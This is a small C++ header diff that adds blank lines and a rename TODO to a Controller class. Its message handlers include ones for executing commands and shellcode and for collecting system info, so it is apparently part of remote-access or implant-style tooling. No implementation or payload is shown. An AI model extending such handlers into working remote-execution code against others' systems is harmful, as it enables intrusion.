@@ -13,8 +13,12 @@ public:
 	Controller(MessageHandler* messageHandler);
 	void handleDefault(const InternalMessage& msg);
 	void handleNone(const InternalMessage& msg);
+
+	// TODO: rename to handleExecuteConsoleCommand? 
 	void handleExecuteCommand(const InternalMessage& msg);
+
 	void handleExecuteShellcode(const InternalMessage& msg);
+
 	void handleSystemInfo(const InternalMessage& msg);
 private:
 	MessageHandler* messageHandler_;
